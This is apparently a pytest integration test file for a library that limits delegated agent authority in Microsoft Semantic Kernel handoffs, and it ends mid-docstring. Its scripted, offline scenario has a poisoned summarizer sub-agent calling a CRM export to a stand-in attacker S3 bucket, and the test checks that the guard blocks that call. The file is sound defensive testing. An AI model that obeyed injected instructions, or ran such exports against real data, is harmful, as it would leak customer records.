"""
Integration test: attenu-guard x Microsoft Semantic Kernel (semantic-kernel 1.36.0).

Runs entirely offline: the LLM is a `ChatCompletionClientBase` subclass that
replays scripted `ChatMessageContent`s carrying `FunctionCallContent` items, so
`ChatCompletionAgent`'s auto-tool-calling loop and the whole
`HandoffOrchestration` actor runtime execute with no API key.

What is asserted is the *user-felt* outcome, not the internals: an orchestrator
hands off to a summarizer sub-agent, the summarizer is poisoned into exfiltrating
CRM data, and the tool body is proven never to have run (via the side-effect
flags the tool would have set).

The test drives the SHIPPED example (`examples/integrations/semantic_kernel/demo.py`
+ `attenu_guard.adapters.semantic_kernel`), so a green run also proves the example works.
"""
from __future__ import annotations

import asyncio
import importlib.util
import sys
from pathlib import Path

import pytest

pytest.importorskip("semantic_kernel")

from semantic_kernel import Kernel  # noqa: E402
from semantic_kernel.contents import ChatHistory  # noqa: E402
from semantic_kernel.contents.function_call_content import FunctionCallContent  # noqa: E402
from semantic_kernel.exceptions.kernel_exceptions import KernelInvokeException  # noqa: E402
from semantic_kernel.filters.filter_types import FilterTypes  # noqa: E402
from semantic_kernel.functions import KernelArguments, kernel_function  # noqa: E402
from semantic_kernel.functions.function_result import FunctionResult  # noqa: E402

from attenu_guard.reasons import BodyState, Capture  # noqa: E402

from attenu_guard import (  # noqa: E402
    AuditLog,
    Authority,
    AuthorityDenied,
    AuthorityError,
    EgressRank,
    Guard,
    ReasonCode,
    RowLimit,
)

# --------------------------------------------------------------------------
# Load the example modules by path.
#
# NOTE: we deliberately do NOT put `examples/integrations/` on sys.path — the
# example directory is itself named `semantic_kernel`, and adding its parent
# would shadow the real framework package. Loading by file location with an
# explicit module name avoids that entirely.
# --------------------------------------------------------------------------
_EXAMPLE_DIR = Path(__file__).resolve().parents[2] / "examples" / "integrations" / "semantic_kernel"


def _load(name: str):
    spec = importlib.util.spec_from_file_location(f"dgsk_{name}", _EXAMPLE_DIR / f"{name}.py")
    assert spec and spec.loader, f"cannot load {name} from {_EXAMPLE_DIR}"
    mod = importlib.util.module_from_spec(spec)
    sys.modules[f"dgsk_{name}"] = mod  # so `demo` can import the adapter
    spec.loader.exec_module(mod)
    return mod


import attenu_guard.adapters.semantic_kernel as dg_sk
demo = _load("demo")


# ==========================================================================
# 1. The headline scenario, driven end-to-end through HandoffOrchestration.
# ==========================================================================

@pytest.fixture(scope="module")
def story():
    """Run the shipped demo once; every assertion below reads its result."""
    return asyncio.run(demo.run_story())


def test_control_unguarded_semantic_kernel_lets_the_export_through():
    """The control, and the whole point of the exercise.

    The SAME HandoffOrchestration with no Guard attached DOES exfiltrate. Without
    this, "the export was blocked" would not distinguish enforcement from a
    script that simply never reached the export — and it is also the evidence
    that Semantic Kernel itself imposes no authority relationship between a
    handoff sender and its target.
    """
    tools = asyncio.run(demo.run_baseline())
    assert tools.crm_query_calls == [4200]
    assert tools.exported_to == ["s3://attacker-bucket/dump.csv"]
    assert tools.crm_export_calls == 1


def test_legitimate_read_executes(story):
    """(a) The in-authority call runs: crm_query(rows=4200) reached its body."""
    assert story.tools.crm_query_calls == [4200]


def test_poisoned_export_denied_before_the_body_runs(story):
    """(b) The poisoned exfiltration never reached the tool body.

    This is the user-felt symptom: no bytes left the building. The side-effect
    flag the tool would have set is the proof — asserting on the Decision alone
    would prove nothing about whether the body ran.
    """
    assert story.tools.exported_to == [], "crm_export body executed — data was exfiltrated"
    assert story.tools.crm_export_calls == 0


def test_denial_is_attributable_and_reasoned(story):
    """The deny carries a machine-readable reason code, not just a message."""
    deny = [d for d in story.decisions if not d.decision]
    assert deny, "expected at least one denial"
    codes = {r.code for d in deny for r in d.decision.reasons}
    assert ReasonCode.SCOPE_NOT_GRANTED in codes


def test_revocation_cascades_to_further_tool_calls(story):
    """(c) After the orchestrator revokes the summarizer, even the previously
    allowed crm.read is denied."""
    assert story.after_revoke_allowed is False
    assert ReasonCode.REVOKED in {r.code for r in story.after_revoke_decision.reasons}


def test_audit_log_verifies_and_records_the_deny(story):
    """(d) The hash-chained log verifies and contains the deny."""
    entries = story.root_guard.audit_log().entries
    ok, err = AuditLog.verify(entries)
    assert ok, f"audit log failed verification: {err}"

    denies = [e for e in entries if e.get("event") == "deny"]
    assert denies, "no deny recorded in the audit log"
    assert any(e.get("reason") == ReasonCode.SCOPE_NOT_GRANTED for e in denies)
    assert any(e.get("tool") == "Crm-crm_export" for e in denies)

    # The delegation itself is on the record, with requested vs granted.
    spawns = [e for e in entries if e.get("event") == "spawn"]
    assert spawns and spawns[0]["agent"] == "Summarizer"


def test_child_authority_is_provably_narrower(story):
    """(e) Structural guarantee: child ⊆ parent."""
    assert story.child_guard.authority.is_narrower_than(story.root_guard.authority)
    assert not story.root_guard.authority.is_narrower_than(story.child_guard.authority)


def test_delegation_graph_shows_the_chain(story):
    graph = story.root_guard.graph()
    assert graph, "expected a non-empty delegation graph"


# ==========================================================================
# 2. Structural: a child can never be minted wider than its parent.
# ==========================================================================

def test_delegation_cannot_widen_beyond_the_parent():
    """A greedy request is silently met down — never granted."""
    root = Guard.issue("orchestrator", Authority(
        scopes={"crm.*", "mail.send"},
        ceilings=[RowLimit(100_000), EgressRank("any")], ttl=3600), task="root")

    greedy = root.delegate("summarizer", Authority(
        scopes={"crm.*", "mail.send", "admin.*"},
        ceilings=[RowLimit(10_000_000), EgressRank("any")], ttl=900),
        task="grab everything")

    assert greedy.authority.is_narrower_than(root.authority)
    assert not greedy.check("admin.delete", context={})
    assert not greedy.check("crm.read", context={"rows": 500_000})
    assert greedy.check("crm.read", context={"rows": 4_200})


# ==========================================================================
# 3. The tool gate is universal: it also fires on a direct kernel.invoke(),
#    not just inside the LLM's auto-tool-calling loop.
#
#    NOTE on exception shape: `Kernel.invoke(...)` re-raises everything as
#    `KernelInvokeException(...) from exc` (semantic_kernel/kernel.py:206-213),
#    so `except AuthorityDenied` does NOT catch a denial that arrived through
#    the kernel-level API — it is the `__cause__`. The adapter's
#    `authority_denial()` unwraps it. `KernelFunction.invoke(...)` re-raises
#    unwrapped (semantic_kernel/functions/kernel_function.py:288-290).
# ==========================================================================

def _cause_chain(exc: BaseException):
    while exc is not None:
        yield exc
        exc = exc.__cause__


def test_function_invocation_filter_gates_direct_kernel_invoke():
    """A FUNCTION_INVOCATION filter runs for every KernelFunction.invoke, so
    calling the plugin directly (no model involved) is gated too."""
    tools = demo.CrmTools()
    root = Guard.issue("orchestrator", Authority(
        scopes={"crm.*"}, ceilings=[RowLimit(100_000), EgressRank("any")], ttl=3600))
    chain = dg_sk.DelegationChain(root_agent="Orchestrator", root_guard=root)
    child = root.delegate("summarizer", Authority(
        scopes={"crm.read"}, ceilings=[RowLimit(5_000), EgressRank("none")], ttl=900),
        task="summarize")
    chain.bind("Summarizer", child)

    kernel = Kernel()
    kernel.add_plugin(tools, plugin_name="Crm")
    dg_sk.attach_guard(kernel, agent_name="Summarizer", chain=chain, policies=demo.POLICIES)

    allowed = asyncio.run(kernel.invoke(
        plugin_name="Crm", function_name="crm_query", arguments=KernelArguments(rows=100)))
    assert tools.crm_query_calls == [100]
    assert allowed is not None

    with pytest.raises(KernelInvokeException) as caught:
        asyncio.run(kernel.invoke(
            plugin_name="Crm", function_name="crm_export",
            arguments=KernelArguments(destination="s3://attacker")))

    decision = dg_sk.authority_denial(caught.value)
    assert decision is not None and not decision
    assert ReasonCode.SCOPE_NOT_GRANTED in {r.code for r in decision.reasons}
    assert tools.exported_to == [], "crm_export body executed despite the denial"


def test_kernel_function_invoke_raises_authority_denied_unwrapped():
    """Straight through `KernelFunction.invoke`, `AuthorityDenied` is not wrapped."""
    tools = demo.CrmTools()
    root = Guard.issue("orchestrator", Authority(
        scopes={"crm.read"}, ceilings=[EgressRank("none")], ttl=3600))
    chain = dg_sk.DelegationChain(root_agent="Orchestrator", root_guard=root)

    kernel = Kernel()
    kernel.add_plugin(tools, plugin_name="Crm")
    dg_sk.attach_guard(kernel, agent_name="Orchestrator", chain=chain, policies=demo.POLICIES)

    function = kernel.get_function("Crm", "crm_export")
    with pytest.raises(AuthorityDenied):
        asyncio.run(function.invoke(
            kernel, KernelArguments(destination="s3://attacker")))
    assert tools.exported_to == []


def test_unmapped_tool_fails_closed():
    """A function with no declared authority cost cannot be shown to be within
    the agent's authority, so it is refused."""
    root = Guard.issue("orchestrator", Authority(scopes={"crm.*"}, ceilings=[], ttl=3600))
    chain = dg_sk.DelegationChain(root_agent="Orchestrator", root_guard=root)

    tools = demo.CrmTools()
    kernel = Kernel()
    kernel.add_plugin(tools, plugin_name="Crm")
    dg_sk.attach_guard(kernel, agent_name="Orchestrator", chain=chain, policies={})

    with pytest.raises(Exception) as caught:
        asyncio.run(kernel.invoke(
            plugin_name="Crm", function_name="crm_query", arguments=KernelArguments(rows=1)))
    assert any(isinstance(e, dg_sk.UnmappedToolError) for e in _cause_chain(caught.value))
    assert tools.crm_query_calls == []


def test_agent_with_no_guard_fails_closed():
    """An agent that was never delegated to has no authority at all."""
    root = Guard.issue("orchestrator", Authority(scopes={"crm.*"}, ceilings=[], ttl=3600))
    chain = dg_sk.DelegationChain(root_agent="Orchestrator", root_guard=root)

    tools = demo.CrmTools()
    kernel = Kernel()
    kernel.add_plugin(tools, plugin_name="Crm")
    dg_sk.attach_guard(kernel, agent_name="Stowaway", chain=chain, policies=demo.POLICIES)

    with pytest.raises(Exception) as caught:
        asyncio.run(kernel.invoke(
            plugin_name="Crm", function_name="crm_query", arguments=KernelArguments(rows=1)))
    assert any(isinstance(e, dg_sk.MissingGuardError) for e in _cause_chain(caught.value))
    assert tools.crm_query_calls == []


def test_fail_closed_refusals_land_in_the_audit_log():
    """An adapter-level refusal must be on the tamper-evident record too.

    An unmapped tool / unknown agent never reaches `Guard.check()`, so without
    `record_refusal` the log would show the attempt as never having happened —
    exactly the event an incident responder wants most.
    """
    root = Guard.issue("orchestrator", Authority(scopes={"crm.*"}, ceilings=[], ttl=3600))
    if not hasattr(root, "record_denial"):
        pytest.skip("installed attenu-guard predates Guard.record_denial")

    chain = dg_sk.DelegationChain(root_agent="Orchestrator", root_guard=root)
    kernel = Kernel()
    kernel.add_plugin(demo.CrmTools(), plugin_name="Crm")
    dg_sk.attach_guard(kernel, agent_name="Stowaway", chain=chain, policies=demo.POLICIES)

    with pytest.raises(Exception):
        asyncio.run(kernel.invoke(
            plugin_name="Crm", function_name="crm_query", arguments=KernelArguments(rows=1)))

    entries = root.audit_log().entries
    ok, err = AuditLog.verify(entries)
    assert ok, f"audit log failed verification: {err}"
    denies = [e for e in entries if e.get("event") == "deny"]
    assert denies, "the fail-closed refusal was not recorded"
    assert denies[-1]["tool"] == "Crm-crm_query"


def test_double_attach_is_refused():
    """Guarding one kernel twice would double every check and every audit entry."""
    root = Guard.issue("orchestrator", Authority(scopes={"crm.*"}, ceilings=[], ttl=3600))
    chain = dg_sk.DelegationChain(root_agent="Orchestrator", root_guard=root)

    kernel = Kernel()
    kernel.add_plugin(demo.CrmTools(), plugin_name="Crm")
    dg_sk.attach_guard(kernel, agent_name="Orchestrator", chain=chain, policies=demo.POLICIES)
    with pytest.raises(ValueError):
        dg_sk.attach_guard(kernel, agent_name="Summarizer", chain=chain, policies=demo.POLICIES)


def test_on_denial_result_returns_a_tool_result_without_running_the_body():
    """The alternative denial mode: the model gets a clean tool result, and the
    body still never runs."""
    tools = demo.CrmTools()
    root = Guard.issue("orchestrator", Authority(
        scopes={"crm.read"}, ceilings=[EgressRank("none")], ttl=3600))
    chain = dg_sk.DelegationChain(root_agent="Orchestrator", root_guard=root)

    kernel = Kernel()
    kernel.add_plugin(tools, plugin_name="Crm")
    dg_sk.attach_guard(kernel, agent_name="Orchestrator", chain=chain,
                       policies=demo.POLICIES, on_denial="result")

    result = asyncio.run(kernel.invoke(
        plugin_name="Crm", function_name="crm_export",
        arguments=KernelArguments(destination="s3://attacker")))
    assert result is not None
    assert "Authorization denied" in str(result.value)
    assert result.metadata["attenu_guard"]["allowed"] is False
    assert tools.exported_to == []


# ==========================================================================
# 3b. Hook point 1, exercised directly: the AUTO_FUNCTION_INVOCATION filter
#     that fires on `Handoff-transfer_to_<Target>`.
#
#     `Kernel.invoke_function_call` is the real entry point the auto-tool-calling
#     loop uses (semantic_kernel/connectors/ai/chat_completion_client_base.py:156)
#     and it runs the auto-invocation filter stack at kernel.py:437-441.
# ==========================================================================

def _handoff_kernel(chain, authority_for):
    """A kernel carrying a stand-in for the synthetic `Handoff` plugin that
    `HandoffAgentActor._add_handoff_functions` mints (handoffs.py:190-221)."""

    class Handoff:
        @kernel_function(name="transfer_to_Summarizer", description="Hand off.")
        def transfer_to_summarizer(self) -> str:
            return "transferred"

    kernel = Kernel()
    kernel.add_plugin(Handoff(), plugin_name=dg_sk.HANDOFF_PLUGIN_NAME)
    dg_sk.attach_guard(kernel, agent_name="Orchestrator", chain=chain,
                       policies=demo.POLICIES, authority_for=authority_for)
    return kernel


def _fire_handoff(kernel):
    return asyncio.run(kernel.invoke_function_call(
        function_call=FunctionCallContent(
            id="h1", name="Handoff-transfer_to_Summarizer", arguments="{}"),
        chat_history=ChatHistory(),
    ))


def test_handoff_mints_the_childs_attenuated_guard():
    root = Guard.issue("orchestrator", Authority(
        scopes={"crm.*", "mail.send"},
        ceilings=[RowLimit(100_000), EgressRank("any")], ttl=3600))
    chain = dg_sk.DelegationChain(root_agent="Orchestrator", root_guard=root)
    assert chain.guard_for("Summarizer") is None

    _fire_handoff(_handoff_kernel(chain, {"Summarizer": demo.SUMMARIZER_AUTHORITY}))

    child = chain.guard_for("Summarizer")
    assert child is not None, "the delegation filter never minted the child Guard"
    assert child.authority.is_narrower_than(root.authority)
    assert bool(child.check("crm.read", context={"rows": 100}))
    assert not child.check("crm.export", context={"egress": "any"})


def test_handoff_from_a_revoked_parent_is_refused():
    """The delegation EDGE is enforced, not just the tools downstream: minting
    goes through `Guard.delegate`, which refuses a revoked parent."""
    root = Guard.issue("orchestrator", Authority(scopes={"crm.*"}, ceilings=[], ttl=3600))
    chain = dg_sk.DelegationChain(root_agent="Orchestrator", root_guard=root)
    kernel = _handoff_kernel(chain, {"Summarizer": demo.SUMMARIZER_AUTHORITY})

    root.revoke()  # the orchestrator itself is revoked

    with pytest.raises(AuthorityError):
        _fire_handoff(kernel)
    assert chain.guard_for("Summarizer") is None, "a revoked parent still delegated"


def test_handoff_to_an_undeclared_target_is_refused():
    """No Authority declared for the target means no handoff — fail closed."""
    root = Guard.issue("orchestrator", Authority(scopes={"crm.*"}, ceilings=[], ttl=3600))
    chain = dg_sk.DelegationChain(root_agent="Orchestrator", root_guard=root)
    kernel = _handoff_kernel(chain, {"SomeoneElse": demo.SUMMARIZER_AUTHORITY})

    with pytest.raises(dg_sk.MissingGuardError):
        _fire_handoff(kernel)
    assert chain.guard_for("Summarizer") is None


# ==========================================================================
# 3c. Semantic Kernel's OTHER delegation primitive: agent-as-plugin.
#
#     `Agent.model_post_init` gives every agent an `_as_kernel_function`
#     (semantic_kernel/agents/agent.py:294-318) whose body calls the sub-agent's
#     own `get_response()`. Adding the agent to a parent's kernel therefore makes
#     "call the sub-agent" just another KernelFunction — so the SAME tool gate
#     covers it, with no extra hook: the parent is authorized for the
#     agent-as-function call, and the sub-agent's own kernel gate authorizes its
#     tools under its own (narrower) Guard.
# ==========================================================================

def test_agent_as_plugin_is_guarded_at_both_levels():
    tools = demo.CrmTools()
    root = Guard.issue("orchestrator", Authority(
        scopes={"crm.*", "mail.send"},
        ceilings=[RowLimit(100_000), EgressRank("any")], ttl=3600))
    chain = dg_sk.DelegationChain(root_agent="Orchestrator", root_guard=root, trace=True)

    summarizer = demo._agent("Summarizer", "Summarizes CRM data.", plugin=tools, script=[
        demo._turn(demo._call("Crm-crm_query", '{"rows": 4200}', "c1")),
        demo._turn(demo._call("Crm-crm_export", '{"destination": "s3://attacker"}', "c2")),
        demo._turn(content="done"),
    ])
    dg_sk.attach_guard(summarizer.kernel, agent_name="Summarizer", chain=chain,
                       policies=demo.POLICIES)

    parent_kernel = Kernel()
    parent_kernel.add_plugin(summarizer, plugin_name="Agents")
    chain.delegate("Orchestrator", "Summarizer", demo.SUMMARIZER_AUTHORITY, task="summarize")
    dg_sk.attach_guard(
        parent_kernel, agent_name="Orchestrator", chain=chain,
        policies={**demo.POLICIES, "Agents-Summarizer": dg_sk.ToolPolicy("crm.read")})

    asyncio.run(parent_kernel.invoke(
        plugin_name="Agents", function_name="Summarizer",
        arguments=KernelArguments(messages="summarize Q3")))

    assert tools.crm_query_calls == [4200]
    assert tools.exported_to == [], "the sub-agent exfiltrated through the agent-as-plugin path"
    attributed = {(c.agent, c.tool, bool(c.decision)) for c in chain.decisions}
    assert ("Orchestrator", "Agents-Summarizer", True) in attributed
    assert ("Summarizer", "Crm-crm_export", False) in attributed


# ==========================================================================
# 4. The Kernel.clone() trap this adapter is built around.
#
#    `HandoffAgentActor.__init__` does `agent.kernel.clone()`
#    (semantic_kernel/agents/orchestration/handoffs.py:175), and `Kernel.clone`
#    DEEPCOPIES the filter lists (semantic_kernel/kernel.py:552-554). A filter
#    that is a callable *object* therefore gets its state — including its
#    Guard — silently forked, and revocation on the original would not reach
#    the clone. Closures survive deepcopy by identity, which is why every
#    filter this adapter registers is a plain function.
# ==========================================================================

def test_guard_state_survives_kernel_clone():
    root = Guard.issue("orchestrator", Authority(
        scopes={"crm.*"}, ceilings=[RowLimit(100_000)], ttl=3600))
    chain = dg_sk.DelegationChain(root_agent="Orchestrator", root_guard=root)
    child = root.delegate("summarizer", Authority(
        scopes={"crm.read"}, ceilings=[RowLimit(5_000)], ttl=900), task="summarize")
    chain.bind("Summarizer", child)

    tools = demo.CrmTools()
    kernel = Kernel()
    kernel.add_plugin(tools, plugin_name="Crm")
    dg_sk.attach_guard(kernel, agent_name="Summarizer", chain=chain, policies=demo.POLICIES)

    cloned = kernel.clone()

    # The clone's filter must still be the SAME object, closing over the SAME chain.
    assert cloned.function_invocation_filters[0][1] is kernel.function_invocation_filters[0][1]

    # Revoking through the original chain must deny through the clone.
    root.revoke(child.node_id)
    with pytest.raises(KernelInvokeException) as caught:
        asyncio.run(cloned.invoke(
            plugin_name="Crm", function_name="crm_query", arguments=KernelArguments(rows=10)))
    decision = dg_sk.authority_denial(caught.value)
    assert decision is not None
    assert ReasonCode.REVOKED in {r.code for r in decision.reasons}
    assert tools.crm_query_calls == []


# ==========================================================================
# Execution binding (0.9.0): record_outcome() on a schema_version=2 chain.
# _dg_tool_gate awaits next(context) itself, exactly like
# adapters/langgraph.py's reference wiring, so WRAPPER_ASYNC is a genuine
# observation with no cross-hook correlation of any kind.
# ==========================================================================
def _v2_kernel(agent_name="Summarizer", authority=None, strict_single_hook=True):
    tools = demo.CrmTools()
    root = Guard.issue("orchestrator", Authority(
        scopes={"crm.*"}, ceilings=[RowLimit(100_000), EgressRank("any")], ttl=3600),
        schema_version=2)
    chain = dg_sk.DelegationChain(root_agent="Orchestrator", root_guard=root)
    child = root.delegate(agent_name.lower(), authority or Authority(
        scopes={"crm.read"}, ceilings=[RowLimit(5_000), EgressRank("none")], ttl=900),
        task="summarize")
    chain.bind(agent_name, child)

    kernel = Kernel()
    kernel.add_plugin(tools, plugin_name="Crm")
    dg_sk.attach_guard(kernel, agent_name=agent_name, chain=chain, policies=demo.POLICIES,
                       strict_single_hook=strict_single_hook)
    return kernel, tools, root, child


def test_v2_allowed_call_records_a_returned_outcome():
    kernel, tools, root, child = _v2_kernel()

    result = asyncio.run(kernel.invoke(
        plugin_name="Crm", function_name="crm_query", arguments=KernelArguments(rows=100)))
    assert tools.crm_query_calls == [100]
    assert result is not None

    entries = root.audit_log().entries
    allow = next(e for e in entries if e["event"] == "allow" and e.get("tool") == "Crm-crm_query")
    outcome = next(e for e in entries if e["event"] == "outcome" and e.get("call_id") == allow["call_id"])
    assert allow["capture"] == Capture.WRAPPER_ASYNC
    assert allow["adapter"]["module"] == "attenu_guard.adapters.semantic_kernel"
    assert outcome["body_state"] == BodyState.RETURNED
    assert allow["authorized_params_hash"] == outcome["invoked_params_hash"]
    assert isinstance(outcome["duration_ms"], int) and outcome["duration_ms"] >= 0
    assert child.complete()


def test_v2_a_tool_that_raises_records_a_raised_outcome():
    class BoomTools:
        def __deepcopy__(self, memo):
            return self

        @kernel_function(name="crm_query", description="Raises instead of returning.")
        def crm_query(self, rows: int) -> str:
            raise ValueError("boom")

    tools = BoomTools()
    root = Guard.issue("orchestrator", Authority(
        scopes={"crm.*"}, ceilings=[RowLimit(100_000), EgressRank("any")], ttl=3600),
        schema_version=2)
    chain = dg_sk.DelegationChain(root_agent="Orchestrator", root_guard=root)
    child = root.delegate("summarizer", Authority(
        scopes={"crm.read"}, ceilings=[RowLimit(5_000), EgressRank("none")], ttl=900),
        task="summarize")
    chain.bind("Summarizer", child)

    kernel = Kernel()
    kernel.add_plugin(tools, plugin_name="Crm")
    dg_sk.attach_guard(kernel, agent_name="Summarizer", chain=chain, policies=demo.POLICIES,
                       strict_single_hook=True)

    with pytest.raises(KernelInvokeException):
        asyncio.run(kernel.invoke(
            plugin_name="Crm", function_name="crm_query", arguments=KernelArguments(rows=100)))

    entries = root.audit_log().entries
    outcome = next(e for e in entries if e["event"] == "outcome")
    assert outcome["body_state"] == BodyState.RAISED
    assert outcome["error_code"] == "ValueError"


def test_v2_denied_call_never_records_an_outcome():
    kernel, tools, root, child = _v2_kernel()

    with pytest.raises(KernelInvokeException):
        asyncio.run(kernel.invoke(
            plugin_name="Crm", function_name="crm_export",
            arguments=KernelArguments(destination="s3://attacker")))

    assert tools.exported_to == []
    entries = root.audit_log().entries
    assert [e for e in entries if e["event"] == "allow" and e.get("tool") == "Crm-crm_export"] == []
    assert [e for e in entries if e["event"] == "outcome"] == []


def test_v1_chain_gets_no_capture_adapter_or_outcome():
    tools = demo.CrmTools()
    root = Guard.issue("orchestrator", Authority(
        scopes={"crm.*"}, ceilings=[RowLimit(100_000), EgressRank("any")], ttl=3600))  # v1, default
    chain = dg_sk.DelegationChain(root_agent="Orchestrator", root_guard=root)
    child = root.delegate("summarizer", Authority(
        scopes={"crm.read"}, ceilings=[RowLimit(5_000), EgressRank("none")], ttl=900),
        task="summarize")
    chain.bind("Summarizer", child)

    kernel = Kernel()
    kernel.add_plugin(tools, plugin_name="Crm")
    dg_sk.attach_guard(kernel, agent_name="Summarizer", chain=chain, policies=demo.POLICIES)

    asyncio.run(kernel.invoke(
        plugin_name="Crm", function_name="crm_query", arguments=KernelArguments(rows=100)))

    entries = root.audit_log().entries
    allow = next(e for e in entries if e["event"] == "allow" and e.get("tool") == "Crm-crm_query")
    assert "capture" not in allow and "adapter" not in allow and "call_id" not in allow
    assert [e for e in entries if e["event"] == "outcome"] == []


def test_v2_async_cancelled_call_records_abandoned_and_still_propagates():
    class HangingTools:
        def __deepcopy__(self, memo):
            return self

        @kernel_function(name="crm_query", description="Hangs.")
        async def crm_query(self, rows: int) -> str:
            await asyncio.sleep(3600)
            return "never"

    tools = HangingTools()
    root = Guard.issue("orchestrator", Authority(
        scopes={"crm.*"}, ceilings=[RowLimit(100_000), EgressRank("any")], ttl=3600),
        schema_version=2)
    chain = dg_sk.DelegationChain(root_agent="Orchestrator", root_guard=root)
    child = root.delegate("summarizer", Authority(
        scopes={"crm.read"}, ceilings=[RowLimit(5_000), EgressRank("none")], ttl=900),
        task="summarize")
    chain.bind("Summarizer", child)

    kernel = Kernel()
    kernel.add_plugin(tools, plugin_name="Crm")
    dg_sk.attach_guard(kernel, agent_name="Summarizer", chain=chain, policies=demo.POLICIES,
                       strict_single_hook=True)

    async def scenario():
        task = asyncio.ensure_future(kernel.invoke(
            plugin_name="Crm", function_name="crm_query", arguments=KernelArguments(rows=100)))
        await asyncio.sleep(0)
        task.cancel()
        with pytest.raises(asyncio.CancelledError):
            await task

    asyncio.run(scenario())
    entries = root.audit_log().entries
    outcome = next(e for e in entries if e["event"] == "outcome")
    assert outcome["body_state"] == BodyState.ABANDONED
    assert "error_code" not in outcome


def test_v2_delegation_never_gets_capture_or_an_outcome():
    """The handoff gate mints the target's Guard via `chain.delegate()` -> `Guard.delegate()`,
    never calling `guard.check()` at all -- unaffected, on any schema version."""
    root = Guard.issue("orchestrator", Authority(
        scopes={"crm.*", "agent.handoff"}, ceilings=[RowLimit(100_000), EgressRank("any")], ttl=3600),
        schema_version=2)
    chain = dg_sk.DelegationChain(root_agent="Orchestrator", root_guard=root)
    child = chain.delegate("Orchestrator", "Summarizer", Authority(
        scopes={"crm.read"}, ceilings=[RowLimit(5_000), EgressRank("none")], ttl=900),
        task="summarize")
    assert child is not None
    entries = root.audit_log().entries
    assert [e for e in entries if e["event"] in ("allow", "outcome")] == []


def test_snapshot_freeze_never_aliases_a_custom_deepcopy_that_returns_itself():
    """Codex review (all six earlier adapters, round 2, finding 4): _freeze() must never call
    ANY copy protocol (copy.deepcopy included) on a container -- a class free to implement
    __deepcopy__ to return `self` would otherwise make a "snapshot" alias the live object."""
    class AliasingList(list):
        def __deepcopy__(self, memo):
            return self

    live = {"x": AliasingList([1])}
    snapshot = dg_sk._freeze(live)

    assert snapshot["x"] is not live["x"], "the snapshot aliased the live mutable container"
    live["x"].append(2)
    assert snapshot["x"] == [1], "mutating the live container changed the snapshot"


# ==========================================================================
# Round 2 (Codex review, batch 2, finding 1): strict_single_hook mode split.
#
# ROUND 2 CORRECTION: the version of this file reviewed by Codex constructed
# `attach_guard` unconditionally with genuine WRAPPER_ASYNC capture -- true only when
# `_dg_tool_gate` is the sole `FilterTypes.FUNCTION_INVOCATION` filter on the kernel for
# its whole lifetime. Pinned `Kernel.add_filter`/`construct_call_stack`
# (`kernel_filters_extension.py`) fold EVERY function-invocation filter registered on the
# SAME kernel into ONE composed chain, and `kernel.add_filter` stays callable after
# `attach_guard` returns -- see adapters/semantic_kernel.py's own "EXECUTION BINDING"
# docstring. strict_single_hook (default False) is the fix: genuine capture is now an
# explicit, scoped attestation, verified below against the framework's OWN
# `Kernel.add_filter`/`construct_call_stack`, not a hand-rolled stand-in.
# ==========================================================================
def test_v2_default_mode_is_pre_hook_only_and_never_records_an_outcome():
    """strict_single_hook defaults to False: every v2 allow gets the Guard's own honest
    Capture.PRE_HOOK_ONLY, and no outcome is ever recorded -- the body still genuinely runs."""
    kernel, tools, root, child = _v2_kernel(strict_single_hook=False)

    result = asyncio.run(kernel.invoke(
        plugin_name="Crm", function_name="crm_query", arguments=KernelArguments(rows=100)))
    assert tools.crm_query_calls == [100]
    assert result is not None

    entries = root.audit_log().entries
    allow = next(e for e in entries if e["event"] == "allow" and e.get("tool") == "Crm-crm_query")
    assert allow["capture"] == Capture.PRE_HOOK_ONLY
    assert allow["adapter"]["hook_path"] == "Guard.check"  # the Guard's own default, not ours
    assert "call_id" in allow
    assert [e for e in entries if e["event"] == "outcome"] == []
    assert child.complete()


@pytest.mark.parametrize("order", ["guard_outer", "sibling_outer"])
def test_v2_strict_mode_never_fabricates_when_a_sibling_short_circuits(order):
    """Compose the guard's own filter with a sibling `FilterTypes.FUNCTION_INVOCATION` filter
    that never calls its own `next` (e.g. a cache/mock hook), using the framework's OWN
    `Kernel.add_filter`/`construct_call_stack` -- the exact primitive `KernelFunction.invoke`
    drives -- in both orders. Pinned `add_filter`'s own docstring: "the first filter added,
    will be the first to be executed" (verified empirically, not assumed):

    * guard_outer: `attach_guard(...)` runs FIRST, so its filter is added first and ends up
      OUTERMOST; the sibling, added after, ends up INNER, closer to the real body, and
      short-circuits before it. This guard's own `await next(context)` still returns
      genuinely, so `_dg_tool_gate` records RETURNED for a body that never ran. The
      documented, deliberately-opted-into residual of a violated attestation.
    * sibling_outer: the sibling is added FIRST (before `attach_guard(...)` runs), so it ends
      up OUTERMOST and short-circuits before this guard's filter is ever reached at all. Safe
      by construction: nothing is authorized, nothing is recorded.
    """
    tools = demo.CrmTools()
    root = Guard.issue("orchestrator", Authority(
        scopes={"crm.*"}, ceilings=[RowLimit(100_000), EgressRank("any")], ttl=3600),
        schema_version=2)
    chain = dg_sk.DelegationChain(root_agent="Orchestrator", root_guard=root)
    child = root.delegate("summarizer", Authority(
        scopes={"crm.read"}, ceilings=[RowLimit(5_000), EgressRank("none")], ttl=900),
        task="summarize")
    chain.bind("Summarizer", child)

    kernel = Kernel()
    kernel.add_plugin(tools, plugin_name="Crm")

    async def short_circuiting_sibling(context, next) -> None:
        # Never calls next() -- stands in for a cache-hit / mocking filter.
        context.result = FunctionResult(
            function=context.function.metadata,
            value="mocked, never reached the real body",
        )

    if order == "guard_outer":
        dg_sk.attach_guard(kernel, agent_name="Summarizer", chain=chain, policies=demo.POLICIES,
                           strict_single_hook=True)
        kernel.add_filter(FilterTypes.FUNCTION_INVOCATION, short_circuiting_sibling)
    else:
        kernel.add_filter(FilterTypes.FUNCTION_INVOCATION, short_circuiting_sibling)
        dg_sk.attach_guard(kernel, agent_name="Summarizer", chain=chain, policies=demo.POLICIES,
                           strict_single_hook=True)

    result = asyncio.run(kernel.invoke(
        plugin_name="Crm", function_name="crm_query", arguments=KernelArguments(rows=100)))
    assert result.value == "mocked, never reached the real body"
    assert tools.crm_query_calls == []

    entries = root.audit_log().entries
    outcomes = [e for e in entries if e["event"] == "outcome"]
    if order == "guard_outer":
        assert outcomes and outcomes[0]["body_state"] == BodyState.RETURNED  # the residual
        assert len([e for e in entries if e["event"] == "allow"]) == 1
    else:
        assert outcomes == []  # the guard's own filter was never reached
        assert [e for e in entries if e["event"] == "allow"] == []


def test_v2_strict_mode_when_guard_is_outer_and_a_sibling_retries_the_real_body():
    """Guard OUTER (added first), a sibling INNER (added after) retries its own `next` twice
    for what the model sees as one function call -- e.g. a retry-on-empty-result filter.
    Verified empirically against the framework's own `Kernel.add_filter`/`construct_call_stack`
